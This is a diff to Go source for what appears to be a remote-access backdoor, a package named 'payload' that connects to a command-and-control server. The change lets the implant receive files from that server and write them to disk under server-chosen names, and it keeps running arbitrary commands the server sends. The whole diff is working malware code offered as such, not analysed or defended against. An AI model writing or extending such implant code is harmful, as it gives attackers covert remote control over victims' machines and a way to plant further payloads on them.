@@ -3,7 +3,9 @@ package payload
 import (
 	"bufio"
 	"fmt"
+	"io"
 	"net"
+	"os"
 	"os/exec"
 	"strconv"
 	"strings"
@@ -32,12 +34,55 @@ func (p *Payload) Run() {
 	p.Conn = conn
 
 	for {
-		// Wait for a message from the command control center
-		p.executeCommand()
+		// commandByteBuffer is the firt byte being sent by the server
+		// we grab this to check if the server is sending over any special commands
+		// to upload a file or execute a program
+		commandByteBuffer := make([]byte, 2)
+		p.Conn.Read(commandByteBuffer)
+
+		fmt.Println("buffer", string(commandByteBuffer))
+
+		switch {
+		case string(commandByteBuffer) == "u:":
+			p.receiveFile()
+			break
+		default:
+			// Wait for a message from the command control center
+			p.executeCommand(commandByteBuffer)
+		}
 	}
 }
 
-func (p *Payload) executeCommand() {
+func (p *Payload) receiveFile() {
+	bufferFileName := make([]byte, 64)
+	bufferFileSize := make([]byte, 10)
+
+	p.Conn.Read(bufferFileSize)
+	fileSize, _ := strconv.ParseInt(strings.Trim(string(bufferFileSize), ":"), 10, 64)
+
+	p.Conn.Read(bufferFileName)
+	fileName := strings.Trim(string(bufferFileName), ":")
+
+	newFile, err := os.Create(fileName)
+	if err != nil {
+		fmt.Println(err)
+	}
+	defer newFile.Close()
+
+	var receivedBytes int64
+
+	for {
+		if (fileSize - receivedBytes) < BufferSize {
+			io.CopyN(newFile, p.Conn, (fileSize - receivedBytes))
+			break
+		}
+		io.CopyN(newFile, p.Conn, BufferSize)
+		receivedBytes += BufferSize
+	}
+	p.Conn.Write([]byte("Received file completely! \n\r"))
+}
+
+func (p *Payload) executeCommand(commandByteBuffer []byte) {
 	// read the incoming message
 	msg, err := bufio.NewReader(p.Conn).ReadString('\r')
 	if err != nil {
@@ -45,13 +90,13 @@ func (p *Payload) executeCommand() {
 		return
 	}
 
-	// fmsg is the full message. since commandByteBuffer read the first 2 bytes
+	// fullmsg is the full message. since commandByteBuffer read the first 2 bytes
 	// and this is not a special command we need those 2 bytez so we add it to the remaing
 	// message from the server
-	// fmsg := string(commandByteBuffer) + msg
+	fullmsg := string(commandByteBuffer) + msg
 
 	// Prepare the command line argument we are going to call
-	cmdArgs := strings.Split(strings.TrimSpace(msg), " ")
+	cmdArgs := strings.Split(strings.TrimSpace(fullmsg), " ")
 	mcmd := cmdArgs[0]
 	cmdArgs = append(cmdArgs[:0], cmdArgs[0+1:]...)
 
